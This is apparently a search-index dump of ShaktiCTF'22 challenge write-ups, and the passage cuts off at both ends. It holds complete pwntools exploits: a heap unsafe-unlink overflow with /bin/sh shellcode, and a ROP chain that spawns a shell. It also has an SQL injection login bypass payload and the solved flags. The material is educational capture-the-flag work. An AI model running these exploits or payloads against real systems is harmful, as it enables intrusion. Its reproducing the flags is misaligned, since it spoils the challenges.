printf(\"\\nChoose your car: \"); fgets(array,50,stdin); for(i=0;i<3;i++){ insert(i); } printf(\"\\nEnter your details before you begin the race\\nName: \"); get_name(0); printf(\"\\nOccupation: \"); get_name(2); printf(\"\\nAddress: \"); get_name(1); delete(1); (*function_pointer)(); return 0; get_name(): This is the function called when we have to read data into the allocated chunks on the heap. The order in which the chunks are read are 0 2 1 . This is important as we can cause an overflow from chunk 1 to chunk 2 , overwrite the function_ptr with the address of array where we have our shellcode into. As we can see from the code below, the allocated chunk size is only 0x30 bytes, whereas we are reading 0x100 bytes of input data. struct node *temp = head; while(temp->id != id && temp->next != NULL) temp = temp->next; if(temp==NULL) return 0; fgets(temp->buffer,0x100,stdin); return 0; Exploitation: To understand the overwrite using the unsafe-unlink technique in heap, we shall take a look at the structure node below: struct node{ int id; char buffer[32]; struct node* next; struct node* prev; }; In the above section of code, we observe that the next and the prev nodes in the struct are right after buffer of size 32 bytes (or 0x20 bytes). The code that is used to remove chunk from its bin is implemented as a macro called unlink and looks something like: #define unlink(P, BK, FD) { \\ FD = P->fd; \\ BK = P->bk; \\ FD->bk = BK; \\ BK->fd = FD; \\ } This is pretty standard code for removing an element from a doubly-linked list. What happens when there's a buffer overflow on the heap? In this case, the attacker is able to overwrite some metadata from the next chunk. When the current chunk is freed, the malicious metadata will be used to trick the heap manager into performing unintended actions. Keeping in mind how the unsafe-unlinking works, we overwrite next with function_ptr-0x28 and prev with array . Here we subtract 0x28 from the address of function_ptr due to the 0x20 buffer + 4 bytes of next and 4 bytes of prev pointer addresses. We shall fill the 0th chunk with a few 'a's. The 2nd chunk with a few 'c's, and use the heap overflow to overwrite the function_ptr with array . Hence when the function_ptr function is called next, our shellcode gets executed instead. For that we need to construct our payload: pay = 'b'*0x20 pay += p32(function_ptr - 0x28) pay += p32(array) pay += p32(0x65) Below is the GDB-dump of the heap at this point! pwndbg> x/20x 0x8ad11a0-0x8 0x8ad1198: 0x00000000 0x00000031 0x00000000 0x61616161 0x8ad11a8: 0x61616161 0x61616161 0x61616161 0x0000000a 0x8ad11b8: 0x00000000 0x00000000 0x00000000 0x08ad11d0 0x8ad11c8: 0x00000000 0x00000031 0x00000001 0x62626262 0x8ad11d8: 0x62626262 0x62626262 0x62626262 0x62626262 pwndbg> 0x8ad11e8: 0x62626262 0x62626262 0x62626262 0x0804c01c 0x8ad11f8: 0x0804c080 0x00000065 0x0000000a 0x63636363 0x8ad1208: 0x63636363 0x63636363 0x63636363 0x0000000a 0x8ad1218: 0x00000000 0x00000000 0x00000000 0x00000000 0x8ad1228: 0x08ad11d0 0x00021dd9 0x00000000 0x00000000 The unlinking takes place as desired, the next and prev pointers in the structure get overwritten. In this way, the function_ptr also gets overwritten to point to the global address of array where the shellcode is stotred. Exploit def shellcode(): shell = 'xor ecx, ecx\\n' shell += 'xor edx, edx\\n' shell += 'push eax\\n' shell += 'push 0x68732f\\n' shell += 'push 0x6e69622f\\n' shell += 'mov ebx, esp\\n' shell += 'push 0xb\\n' shell += 'pop eax\\n' shell += 'int 0x80\\n' return asm(shell) from pwn import * p = process('./racing_cars') exe = ELF('./racing_cars') gdb.attach(p, gdbscript='b*0x0804971c\\n') #p = remote('65.2.136.80', 32645) p.sendlineafter('Choose your car: ', shellcode()) p.sendlineafter('Name: ', 'a'*0x10) p.sendlineafter('Occupation: ', 'c'*0x10) function_ptr = 0x804c044 arr = 0x804c080 pay = 'b'*0x20 pay += p32(function_ptr - 0x28) pay += p32(arr) pay += p32(0x65) p.sendlineafter('Address: ', pay) p.interactive()","title":"racing_cars"},{"location":"ShaktiCTF22/pwn/racing_cars/writeup/#racing_cars","text":"Author: d1g174l_f0rtr355 Solves: 2 Difficulty: Medium This is one of the heap challenges I made for ShaktiCTF'22. The binary provided is a stripped binary, making it difficult. However useful decompilers such as Ghidra/ IDA make it easy to debug and decompile.","title":"racing_cars"},{"location":"ShaktiCTF22/pwn/racing_cars/writeup/#preliminary-checks","text":"We observe that the binary given is a 32 bit stripped binary with the following cheks enabled and disabled: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments One key security check to note here is that the NX bit is disabled. This makes it easy for us to inject a shellcode and execute it. However the question is how?","title":"Preliminary Checks:"},{"location":"ShaktiCTF22/pwn/racing_cars/writeup/#understanding-the-challenge","text":"For the purpose of understanding, let's take a look at the source code which was also released during the CTF. We notice a few things such as: - structure node: This node contains an interger id , a char buffer and two other nodes pointers namely, next , and prev . struct node{ int id; char buffer[32]; struct node* next; struct node* prev; }; - insert: Here, the node temp is a pointer that contaoins the malloced chunk. The size allocated is 0x30 bytes, as can be seen in GDB (set a break point at 0x8049391 where malloc() is called, and check the heap address present in the eax register after calling malloc()). We also observe that the pointer to the next chunk of the current chunk is nulled out. This function is responsible for inserting the current node onto the heap. int insert(int id){ struct node *temp = malloc(sizeof(struct node)); temp->next = NULL; temp->id = id; if(head==NULL){ head = temp; head->prev = NULL; return 1; } struct node *iter = head; while(iter->next != NULL){ iter = iter->next; } iter->next = temp; temp->prev = iter; return 1; } pwndbg> x/20x 0x804d1a0-0x8 0x804d198: 0x00000000 0x00000031 0x00000000 0x00000000 0x804d1a8: 0x00000000 0x00000000 0x00000000 0x00000000 0x804d1b8: 0x00000000 0x00000000 0x00000000 0x00000000 0x804d1c8: 0x00000000 0x00021e39 0x00000000 0x00000000 0x804d1d8: 0x00000000 0x00000000 0x00000000 0x00000000 pwndbg> - delete: This function is responsible for freeing an allocated chunk. The freeing process is similar to that in unlink where upon freeing a current chunk, its forward and backward pointers point to the current chunk's forward and backward chunks. int delete(int id){ struct node *temp = head; while(temp->id != id && temp->next != NULL) temp = temp->next; if(temp==NULL) return 0; if(temp->next == NULL) temp->prev->next = NULL; if(temp->prev == NULL) temp->next->prev = NULL; if(temp->next != NULL && temp->prev != NULL){ temp->prev->next = temp->next; temp->next->prev = temp->prev; } free(temp); return 0; } - main: Here we see an input taken into the global variable array with our input size being 50. This is where we shall place our shellcode for program redirection. Further we see that 3 chunks are being allocated on heap (through insert()). The chunks are read from the get_name() function where we observe the overflow happening. The order the chunks are being read in and the index of the chunk which is deleted is of importance to check. printf(\"\\nChoose your car: \"); fgets(array,50,stdin); for(i=0;i<3;i++){ insert(i); } printf(\"\\nEnter your details before you begin the race\\nName: \"); get_name(0); printf(\"\\nOccupation: \"); get_name(2); printf(\"\\nAddress: \"); get_name(1); delete(1); (*function_pointer)(); return 0; get_name(): This is the function called when we have to read data into the allocated chunks on the heap. The order in which the chunks are read are 0 2 1 . This is important as we can cause an overflow from chunk 1 to chunk 2 , overwrite the function_ptr with the address of array where we have our shellcode into. As we can see from the code below, the allocated chunk size is only 0x30 bytes, whereas we are reading 0x100 bytes of input data. struct node *temp = head; while(temp->id != id && temp->next != NULL) temp = temp->next; if(temp==NULL) return 0; fgets(temp->buffer,0x100,stdin); return 0;","title":"Understanding the challenge"},{"location":"ShaktiCTF22/pwn/racing_cars/writeup/#exploitation","text":"To understand the overwrite using the unsafe-unlink technique in heap, we shall take a look at the structure node below: struct node{ int id; char buffer[32]; struct node* next; struct node* prev; }; In the above section of code, we observe that the next and the prev nodes in the struct are right after buffer of size 32 bytes (or 0x20 bytes). The code that is used to remove chunk from its bin is implemented as a macro called unlink and looks something like: #define unlink(P, BK, FD) { \\ FD = P->fd; \\ BK = P->bk; \\ FD->bk = BK; \\ BK->fd = FD; \\ } This is pretty standard code for removing an element from a doubly-linked list. What happens when there's a buffer overflow on the heap? In this case, the attacker is able to overwrite some metadata from the next chunk. When the current chunk is freed, the malicious metadata will be used to trick the heap manager into performing unintended actions. Keeping in mind how the unsafe-unlinking works, we overwrite next with function_ptr-0x28 and prev with array . Here we subtract 0x28 from the address of function_ptr due to the 0x20 buffer + 4 bytes of next and 4 bytes of prev pointer addresses. We shall fill the 0th chunk with a few 'a's. The 2nd chunk with a few 'c's, and use the heap overflow to overwrite the function_ptr with array . Hence when the function_ptr function is called next, our shellcode gets executed instead. For that we need to construct our payload: pay = 'b'*0x20 pay += p32(function_ptr - 0x28) pay += p32(array) pay += p32(0x65) Below is the GDB-dump of the heap at this point! pwndbg> x/20x 0x8ad11a0-0x8 0x8ad1198: 0x00000000 0x00000031 0x00000000 0x61616161 0x8ad11a8: 0x61616161 0x61616161 0x61616161 0x0000000a 0x8ad11b8: 0x00000000 0x00000000 0x00000000 0x08ad11d0 0x8ad11c8: 0x00000000 0x00000031 0x00000001 0x62626262 0x8ad11d8: 0x62626262 0x62626262 0x62626262 0x62626262 pwndbg> 0x8ad11e8: 0x62626262 0x62626262 0x62626262 0x0804c01c 0x8ad11f8: 0x0804c080 0x00000065 0x0000000a 0x63636363 0x8ad1208: 0x63636363 0x63636363 0x63636363 0x0000000a 0x8ad1218: 0x00000000 0x00000000 0x00000000 0x00000000 0x8ad1228: 0x08ad11d0 0x00021dd9 0x00000000 0x00000000 The unlinking takes place as desired, the next and prev pointers in the structure get overwritten. In this way, the function_ptr also gets overwritten to point to the global address of array where the shellcode is stotred.","title":"Exploitation:"},{"location":"ShaktiCTF22/pwn/racing_cars/writeup/#exploit","text":"def shellcode(): shell = 'xor ecx, ecx\\n' shell += 'xor edx, edx\\n' shell += 'push eax\\n' shell += 'push 0x68732f\\n' shell += 'push 0x6e69622f\\n' shell += 'mov ebx, esp\\n' shell += 'push 0xb\\n' shell += 'pop eax\\n' shell += 'int 0x80\\n' return asm(shell) from pwn import * p = process('./racing_cars') exe = ELF('./racing_cars') gdb.attach(p, gdbscript='b*0x0804971c\\n') #p = remote('65.2.136.80', 32645) p.sendlineafter('Choose your car: ', shellcode()) p.sendlineafter('Name: ', 'a'*0x10) p.sendlineafter('Occupation: ', 'c'*0x10) function_ptr = 0x804c044 arr = 0x804c080 pay = 'b'*0x20 pay += p32(function_ptr - 0x28) pay += p32(arr) pay += p32(0x65) p.sendlineafter('Address: ', pay) p.interactive()","title":"Exploit"},{"location":"ShaktiCTF22/pwn/ropework/writeup/","text":"ropework Author: d1g174l_f0rtr355 Solves: 9 Difficulty: Medium Preliminary Analysis: We notice that the binary is a 64-bit non-stripped binary with the folloeing protections: Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Understanding the challenge: The binary itself is very simple: char s[16]; // [rsp+0h] [rbp-10h] BYREF setvbuf(_bss_start, 0LL, 2, 0LL); system(\"echo 'The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\\n'\"); fgets(s, 329, stdin); system(\"echo 'Ok bye!\\n'\"); return 0; Since there is no other function to return to and with PIE being disabled, we can begin our exploitation by creating a suitable ROP chain. There could be other ways pf creating the ROP chain with the available gadgets. I would be showing one of those methods. Exploitation: The ROP chain is made up of the following instructions: pop_rdi = 0x0000000000401273# pop rdi ; ret pop_rsi = 0x0000000000401271# pop rsi ; pop r15 ; ret pop_r12 = 0x000000000040126c# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret xor_rax_rax = 0x0000000000401182# xor_rax_rbx = 0x0000000000401186 xor_rbx_rbx = 0x000000000040118a xor_rdx_rbx = 0x000000000040118e xor_rdx_rdx = 0x0000000000401192 mov_rbx_r10 = 0x000000000040117e movq_rdx_r10 = 0x000000000040119e# mov qword ptr [rdx], r10 ; ret xor_r10_r10 = 0x0000000000401196 xor_r10_r12 = 0x000000000040119a ret = 0x0000000000401205 syscall = 0x00000000004011a2 Upon xorring two same registers, the registers get nulled out. We can transfer the contents of a register to another using xor with the help of a similar technique. Since anything xorred with 0 is the number itself, we make use of this concept to eventually place the string \"/bin/sh\" into a bss address. We then pop the address into register rdi . We also set rax to contain 0x3b and null out registers rsi and rdx before making the syscall. Exploit: from pwn import * p = process('./ropework') #gdb.attach(p, gdbscript='set follow-fork-mode parent\\n') #p = remote('localhost', 4008) p.recvline() ''' gadgets ''' pop_rdi = 0x0000000000401273 pop_rsi = 0x0000000000401271 pop_r12 = 0x000000000040126c xor_rax_rax = 0x0000000000401182 xor_rax_rbx = 0x0000000000401186 xor_rbx_rbx = 0x000000000040118a xor_rdx_rbx = 0x000000000040118e xor_rdx_rdx = 0x0000000000401192 mov_rbx_r10 = 0x000000000040117e movq_rdx_r10 = 0x000000000040119e xor_r10_r10 = 0x0000000000401196 xor_r10_r12 = 0x000000000040119a ret = 0x0000000000401205 syscall = 0x00000000004011a2 bss = 0x404030 pay = 'a'*0x10 pay += 'b'*0x8 pay += p64(ret)# leave_ret pay += p64(pop_r12) pay += p64(bss) pay += p64(0x0) pay += p64(0x0) pay += p64(0x0) pay += p64(xor_r10_r10) pay += p64(xor_r10_r12) pay += p64(xor_rbx_rbx) pay += p64(mov_rbx_r10) pay += p64(xor_rdx_rdx) pay += p64(xor_rdx_rbx) pay += p64(pop_r12) pay += p64(u64(\"/bin/sh\\x00\")) pay += p64(0x0) pay += p64(0x0) pay += p64(0x0) pay += p64(xor_r10_r10) pay += p64(xor_r10_r12) pay += p64(movq_rdx_r10) pay += p64(pop_rdi) pay += p64(bss) pay += p64(pop_r12) pay += p64(0x3b) pay += p64(0x0) pay += p64(0x0) pay += p64(0x0) pay += p64(xor_r10_r10) pay += p64(xor_r10_r12) pay += p64(xor_rbx_rbx) pay += p64(mov_rbx_r10) pay += p64(xor_rax_rax) pay += p64(xor_rax_rbx) pay += p64(xor_rdx_rdx) pay += p64(pop_rsi) pay += p64(0x0) pay += p64(0x0) #pay += p64(xor_rbx_rbx) pay += p64(syscall) #pay += p64(ret) print(len(pay)) p.sendline(pay) p.interactive()","title":"ropework"},{"location":"ShaktiCTF22/pwn/ropework/writeup/#ropework","text":"Author: d1g174l_f0rtr355 Solves: 9 Difficulty: Medium","title":"ropework"},{"location":"ShaktiCTF22/pwn/ropework/writeup/#preliminary-analysis","text":"We notice that the binary is a 64-bit non-stripped binary with the folloeing protections: Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)","title":"Preliminary Analysis:"},{"location":"ShaktiCTF22/pwn/ropework/writeup/#understanding-the-challenge","text":"The binary itself is very simple: char s[16]; // [rsp+0h] [rbp-10h] BYREF setvbuf(_bss_start, 0LL, 2, 0LL); system(\"echo 'The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\\n'\"); fgets(s, 329, stdin); system(\"echo 'Ok bye!\\n'\"); return 0; Since there is no other function to return to and with PIE being disabled, we can begin our exploitation by creating a suitable ROP chain. There could be other ways pf creating the ROP chain with the available gadgets. I would be showing one of those methods.","title":"Understanding the challenge:"},{"location":"ShaktiCTF22/pwn/ropework/writeup/#exploitation","text":"The ROP chain is made up of the following instructions: pop_rdi = 0x0000000000401273# pop rdi ; ret pop_rsi = 0x0000000000401271# pop rsi ; pop r15 ; ret pop_r12 = 0x000000000040126c# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret xor_rax_rax = 0x0000000000401182# xor_rax_rbx = 0x0000000000401186 xor_rbx_rbx = 0x000000000040118a xor_rdx_rbx = 0x000000000040118e xor_rdx_rdx = 0x0000000000401192 mov_rbx_r10 = 0x000000000040117e movq_rdx_r10 = 0x000000000040119e# mov qword ptr [rdx], r10 ; ret xor_r10_r10 = 0x0000000000401196 xor_r10_r12 = 0x000000000040119a ret = 0x0000000000401205 syscall = 0x00000000004011a2 Upon xorring two same registers, the registers get nulled out. We can transfer the contents of a register to another using xor with the help of a similar technique. Since anything xorred with 0 is the number itself, we make use of this concept to eventually place the string \"/bin/sh\" into a bss address. We then pop the address into register rdi . We also set rax to contain 0x3b and null out registers rsi and rdx before making the syscall.","title":"Exploitation:"},{"location":"ShaktiCTF22/pwn/ropework/writeup/#exploit","text":"from pwn import * p = process('./ropework') #gdb.attach(p, gdbscript='set follow-fork-mode parent\\n') #p = remote('localhost', 4008) p.recvline() ''' gadgets ''' pop_rdi = 0x0000000000401273 pop_rsi = 0x0000000000401271 pop_r12 = 0x000000000040126c xor_rax_rax = 0x0000000000401182 xor_rax_rbx = 0x0000000000401186 xor_rbx_rbx = 0x000000000040118a xor_rdx_rbx = 0x000000000040118e xor_rdx_rdx = 0x0000000000401192 mov_rbx_r10 = 0x000000000040117e movq_rdx_r10 = 0x000000000040119e xor_r10_r10 = 0x0000000000401196 xor_r10_r12 = 0x000000000040119a ret = 0x0000000000401205 syscall = 0x00000000004011a2 bss = 0x404030 pay = 'a'*0x10 pay += 'b'*0x8 pay += p64(ret)# leave_ret pay += p64(pop_r12) pay += p64(bss) pay += p64(0x0) pay += p64(0x0) pay += p64(0x0) pay += p64(xor_r10_r10) pay += p64(xor_r10_r12) pay += p64(xor_rbx_rbx) pay += p64(mov_rbx_r10) pay += p64(xor_rdx_rdx) pay += p64(xor_rdx_rbx) pay += p64(pop_r12) pay += p64(u64(\"/bin/sh\\x00\")) pay += p64(0x0) pay += p64(0x0) pay += p64(0x0) pay += p64(xor_r10_r10) pay += p64(xor_r10_r12) pay += p64(movq_rdx_r10) pay += p64(pop_rdi) pay += p64(bss) pay += p64(pop_r12) pay += p64(0x3b) pay += p64(0x0) pay += p64(0x0) pay += p64(0x0) pay += p64(xor_r10_r10) pay += p64(xor_r10_r12) pay += p64(xor_rbx_rbx) pay += p64(mov_rbx_r10) pay += p64(xor_rax_rax) pay += p64(xor_rax_rbx) pay += p64(xor_rdx_rdx) pay += p64(pop_rsi) pay += p64(0x0) pay += p64(0x0) #pay += p64(xor_rbx_rbx) pay += p64(syscall) #pay += p64(ret) print(len(pay)) p.sendline(pay) p.interactive()","title":"Exploit:"},{"location":"ShaktiCTF22/reversing/","text":"Reverse Engineering Challenge Name Level Author Love Calculator Beginner k1n0r4 Y2 for Win Easy k1n0r4 Clicky Medium k1n0r4","title":"Reverse Engineering"},{"location":"ShaktiCTF22/reversing/#reverse-engineering","text":"Challenge Name Level Author Love Calculator Beginner k1n0r4 Y2 for Win Easy k1n0r4 Clicky Medium k1n0r4","title":"Reverse Engineering"},{"location":"ShaktiCTF22/reversing/Clicky/","text":"Clicky Description You are a Secret Agent appointed to destroy a planet but you don't have resources to do that, but you have access to Death Star's deadly weapon Superlaser. You need to enter the correct pin for the superlaser to launch. Your companion invaded their system and recovered a file which has the pin hidden in the file. All you have to do is find the correct sequence of numbers to launch the superlaser. Note: Enter the right sequence of numbers separated by an underscore and wrap it around the flag format given. Flag format : flag{...} Solution The given file is an executable, but for basic analysis we use the tool named as DIE to find more details about the file. The analysis indicates that it is dotnet file, thus we use dnspy to disassemble the executable. Navigate to the code part of the file via this path and now you could see the c# code for the file. Here we are asked to find the correct sequence of buttons that needs to be clicked in order to get the win statement. On observing the code, we could see this pattern On clicking button 5, there is a check to ensure that the next button, that is, button 7 is clicked, thereafter it checks if button 3 is clicked and consequentively for button 1. If all this buttons are clicked in the given order, we get the final statement. Button 5, 7, 3 and 1 are initialized as 429, 529, 216 and 88. Thus we click buttons 429, 529, 216 and 88 in the given order to get the win statement. Flag : shaktictf{429_529_216_88}","title":"Clicky"},{"location":"ShaktiCTF22/reversing/Clicky/#clicky","text":"","title":"Clicky"},{"location":"ShaktiCTF22/reversing/Clicky/#description","text":"You are a Secret Agent appointed to destroy a planet but you don't have resources to do that, but you have access to Death Star's deadly weapon Superlaser. You need to enter the correct pin for the superlaser to launch. Your companion invaded their system and recovered a file which has the pin hidden in the file. All you have to do is find the correct sequence of numbers to launch the superlaser.","title":"Description"},{"location":"ShaktiCTF22/reversing/Clicky/#note-enter-the-right-sequence-of-numbers-separated-by-an-underscore-and-wrap-it-around-the-flag-format-given","text":"Flag format : flag{...}","title":"Note: Enter the right sequence of numbers separated by an underscore and wrap it around the flag format given."},{"location":"ShaktiCTF22/reversing/Clicky/#solution","text":"The given file is an executable, but for basic analysis we use the tool named as DIE to find more details about the file. The analysis indicates that it is dotnet file, thus we use dnspy to disassemble the executable. Navigate to the code part of the file via this path and now you could see the c# code for the file. Here we are asked to find the correct sequence of buttons that needs to be clicked in order to get the win statement. On observing the code, we could see this pattern On clicking button 5, there is a check to ensure that the next button, that is, button 7 is clicked, thereafter it checks if button 3 is clicked and consequentively for button 1. If all this buttons are clicked in the given order, we get the final statement. Button 5, 7, 3 and 1 are initialized as 429, 529, 216 and 88. Thus we click buttons 429, 529, 216 and 88 in the given order to get the win statement.","title":"Solution"},{"location":"ShaktiCTF22/reversing/Clicky/#flag-shaktictf429_529_216_88","text":"","title":"Flag : shaktictf{429_529_216_88}"},{"location":"ShaktiCTF22/reversing/LoveCalculator/","text":"Love Calculator Challenge Description : Here is something you always wanted to stumble upon, A Love Caluculator...Go on and check your luck. Author - k1n0r4 Solution We are provided with a binary and on opening the binary in IDA disassembler and decompiler we see the following pseudo code. The binary asks for two inputs - your name and your crush's name. But regardless of our input it displays the message Next it asks for a passkey which is actually the correct flag. Thus, our aim is to provide a desired input which would enable the binary to display the win statement. Our input passkey is being compared with a char array named as v9 here( the name would differ from user to user). v9 is being initialized before the check. The entire passkey is divided into several small parts, those parts are initialized to different char arrays and then the entire thing is concatenated in a particular order. Correct Input - l3t5_s0lv3_m0r3_ch4ll3ng3s Flag - shaktictf{l3t5_s0lv3_m0r3_ch4ll3ng3s}","title":"Love Calculator"},{"location":"ShaktiCTF22/reversing/LoveCalculator/#love-calculator","text":"","title":"Love Calculator"},{"location":"ShaktiCTF22/reversing/LoveCalculator/#challenge-description","text":"Here is something you always wanted to stumble upon, A Love Caluculator...Go on and check your luck.","title":"Challenge Description :"},{"location":"ShaktiCTF22/reversing/LoveCalculator/#author-k1n0r4","text":"","title":"Author - k1n0r4"},{"location":"ShaktiCTF22/reversing/LoveCalculator/#solution","text":"We are provided with a binary and on opening the binary in IDA disassembler and decompiler we see the following pseudo code. The binary asks for two inputs - your name and your crush's name. But regardless of our input it displays the message Next it asks for a passkey which is actually the correct flag. Thus, our aim is to provide a desired input which would enable the binary to display the win statement. Our input passkey is being compared with a char array named as v9 here( the name would differ from user to user). v9 is being initialized before the check. The entire passkey is divided into several small parts, those parts are initialized to different char arrays and then the entire thing is concatenated in a particular order. Correct Input - l3t5_s0lv3_m0r3_ch4ll3ng3s Flag - shaktictf{l3t5_s0lv3_m0r3_ch4ll3ng3s}","title":"Solution"},{"location":"ShaktiCTF22/reversing/y2/","text":"Y2 for win Challenge Description : Have you ever dealt with so many limitations??? If not then here you go... Author - k1n0r4 Solution View the binary in ida and you shall see a funcrtion named constraints containing a lot of checks Here make use of the tool z3-solver Script - ```python= from z3 import * a1 = [BitVec(\"a1%i\"%i,8) for i in range(25)] s = Solver() s.add(a1[13] * a1[9] - a1[23] == 10401) s.add(a1[0] + a1[5] * a1[2] == 9147) s.add(a1[2] * a1[8] - a1[13] == 10340) s.add(a1[7] + a1[6] - a1[23] == 138) s.add(a1[18] + a1[15] - a1[14] == 70) s.add(a1[19] - a1[12] * a1[24] == -5808) s.add(a1[21] * a1[16] - a1[10] == 4726) s.add(a1[4] * a1[17] - a1[22] == 13130) s.add(a1[3] * a1[1] - a1[11] == 2395) s.add(a1[20] + a1[3] * a1[11] == 5214) s.add(a1[8] * a1[5] - a1[20] == 10332) s.add(a1[0] - a1[16] - a1[16] == -68) s.add(a1[22] + a1[13] - a1[6] == 103) s.add(a1[18] - a1[12] - a1[21] == -54) s.add(a1[10] * a1[15] - a1[9] == 13828) s.add(a1[19] + a1[24] - a1[14] == 129) s.add(a1[4] * a1[17] - a1[7] == 13140) s.add(a1[8] + a1[14] - a1[1] == 154) s.add(a1[23] + a1[17] - a1[9] == 69) s.add(a1[19] * a1[10] + a1[3] == 12901) s.add(a1[5] + a1[21] * a1[12] == 2696) s.add(a1[6] - a1[1] + a1[24] == 167) s.add(a1[0] + a1[4] * a1[15] == 13577) s.add(a1[7] - a1[18] - a1[20] == -81) s.add(a1[7] - a1[18] - a1[20] == -81) s.add(a1[9] + a1[19] * a1[8] == 11975) s.add(a1[10] - a1[23] + a1[0] == 192) s.add(a1[14] + a1[21] * a1[3] == 2594) s.add(a1[16] + a1[12] + a1[1] == 197) s.add(a1[6] + a1[20] - a1[13] == 110) s.add(a1[5] - a1[21] + a1[16] == 139) if s.check()==sat: m = s.model() flag = [chr(int(str(m[a1[i]]))) for i in range(len(m))] print(''.join(flag)) ``` Output - z3_1s_fUn_wh3n_u_s0lv3_1t Correct Input - z3_1s_fUn_wh3n_u_s0lv3_1t Flag - shaktictf{z3_1s_fUn_wh3n_u_s0lv3_1t}","title":"Y2 for win"},{"location":"ShaktiCTF22/reversing/y2/#y2-for-win","text":"","title":"Y2 for win"},{"location":"ShaktiCTF22/reversing/y2/#challenge-description","text":"Have you ever dealt with so many limitations??? If not then here you go...","title":"Challenge Description :"},{"location":"ShaktiCTF22/reversing/y2/#author-k1n0r4","text":"","title":"Author - k1n0r4"},{"location":"ShaktiCTF22/reversing/y2/#solution","text":"View the binary in ida and you shall see a funcrtion named constraints containing a lot of checks Here make use of the tool z3-solver","title":"Solution"},{"location":"ShaktiCTF22/reversing/y2/#script-","text":"```python= from z3 import * a1 = [BitVec(\"a1%i\"%i,8) for i in range(25)] s = Solver() s.add(a1[13] * a1[9] - a1[23] == 10401) s.add(a1[0] + a1[5] * a1[2] == 9147) s.add(a1[2] * a1[8] - a1[13] == 10340) s.add(a1[7] + a1[6] - a1[23] == 138) s.add(a1[18] + a1[15] - a1[14] == 70) s.add(a1[19] - a1[12] * a1[24] == -5808) s.add(a1[21] * a1[16] - a1[10] == 4726) s.add(a1[4] * a1[17] - a1[22] == 13130) s.add(a1[3] * a1[1] - a1[11] == 2395) s.add(a1[20] + a1[3] * a1[11] == 5214) s.add(a1[8] * a1[5] - a1[20] == 10332) s.add(a1[0] - a1[16] - a1[16] == -68) s.add(a1[22] + a1[13] - a1[6] == 103) s.add(a1[18] - a1[12] - a1[21] == -54) s.add(a1[10] * a1[15] - a1[9] == 13828) s.add(a1[19] + a1[24] - a1[14] == 129) s.add(a1[4] * a1[17] - a1[7] == 13140) s.add(a1[8] + a1[14] - a1[1] == 154) s.add(a1[23] + a1[17] - a1[9] == 69) s.add(a1[19] * a1[10] + a1[3] == 12901) s.add(a1[5] + a1[21] * a1[12] == 2696) s.add(a1[6] - a1[1] + a1[24] == 167) s.add(a1[0] + a1[4] * a1[15] == 13577) s.add(a1[7] - a1[18] - a1[20] == -81) s.add(a1[7] - a1[18] - a1[20] == -81) s.add(a1[9] + a1[19] * a1[8] == 11975) s.add(a1[10] - a1[23] + a1[0] == 192) s.add(a1[14] + a1[21] * a1[3] == 2594) s.add(a1[16] + a1[12] + a1[1] == 197) s.add(a1[6] + a1[20] - a1[13] == 110) s.add(a1[5] - a1[21] + a1[16] == 139) if s.check()==sat: m = s.model() flag = [chr(int(str(m[a1[i]]))) for i in range(len(m))] print(''.join(flag)) ```","title":"Script -"},{"location":"ShaktiCTF22/reversing/y2/#output-z3_1s_fun_wh3n_u_s0lv3_1t","text":"Correct Input - z3_1s_fUn_wh3n_u_s0lv3_1t","title":"Output - z3_1s_fUn_wh3n_u_s0lv3_1t"},{"location":"ShaktiCTF22/reversing/y2/#flag-shaktictfz3_1s_fun_wh3n_u_s0lv3_1t","text":"","title":"Flag - shaktictf{z3_1s_fUn_wh3n_u_s0lv3_1t}"},{"location":"ShaktiCTF22/web/be_alert/","text":"Be Alert Description : I made my first ever login page! Try to login. Author: Ramya Solution: When you visit the challenge link, we can see that Something appears in /flag.html . When we got to /flag.html, we can see a password field. In the source code we can see the following javascipt code. let word = \"rg`jsh`clhm\"; let password = \"\"; function chall(word) { for (let i=0; i<word.length;i++) { password += String.fromCharCode(word.charCodeAt(i) + 1); } return password } When we run the above js code, we get the password as shaktiadmin . Submit the password in /flag.html and we get the flag. Flag: shaktictf{c0n9r4t5_u53r_hehe65445746}","title":"Be alert"},{"location":"ShaktiCTF22/web/be_alert/#be-alert","text":"Description : I made my first ever login page! Try to login. Author: Ramya Solution: When you visit the challenge link, we can see that Something appears in /flag.html . When we got to /flag.html, we can see a password field. In the source code we can see the following javascipt code. let word = \"rg`jsh`clhm\"; let password = \"\"; function chall(word) { for (let i=0; i<word.length;i++) { password += String.fromCharCode(word.charCodeAt(i) + 1); } return password } When we run the above js code, we get the password as shaktiadmin . Submit the password in /flag.html and we get the flag. Flag: shaktictf{c0n9r4t5_u53r_hehe65445746}","title":"Be Alert"},{"location":"ShaktiCTF22/web/failed/","text":"L0g1n F4il3d Description : I made my first ever login page! Try to login. Author: Av4nth1ka Solution : This is a very very basic SQL injection challenge. First of all we have a login page. When we try to login with some username and password, we get the message as \u201cwrong credentials\u201d. When we get a login page the first thing we look for is whether the page is vulnerable to SQL injection or not. So we can try giving a very basic sql injection payload. payload: \u2018 or 1=1 \u2014 When we give the above query to the username or password field we get a message as follows. Hey '' or 1=1 --'! Here is your flag: '('admin', 'shaktictf{s1mpl3_sql_inject1on_ehehhehe564321345}')'. YEAHH! We got the flag!! From the above message we can understand that admin\u2019s password was the flag. Flag: shaktictf{s1mpl3_sql_inject1on_ehehhehe564321345}","title":"L0g1n F4il3d"},{"location":"ShaktiCTF22/web/failed/#l0g1n-f4il3d","text":"Description : I made my first ever login page! Try to login. Author: Av4nth1ka Solution : This is a very very basic SQL injection challenge. First of all we have a login page. When we try to login with some username and password, we get the message as \u201cwrong credentials\u201d. When we get a login page the first thing we look for is whether the page is vulnerable to SQL injection or not. So we can try giving a very basic sql injection payload. payload: \u2018 or 1=1 \u2014 When we give the above query to the username or password field we get a message as follows. Hey '' or 1=1 --'! Here is your flag: '('admin', 'shaktictf{s1mpl3_sql_inject1on_ehehhehe564321345}')'. YEAHH! We got the flag!! From the above message we can understand that admin\u2019s password was the flag. Flag: shaktictf{s1mpl3_sql_inject1on_ehehhehe564321345}","title":"L0g1n F4il3d"},{"location":"ShaktiCTF22/web/hey/","text":"Hey h3ck3r! 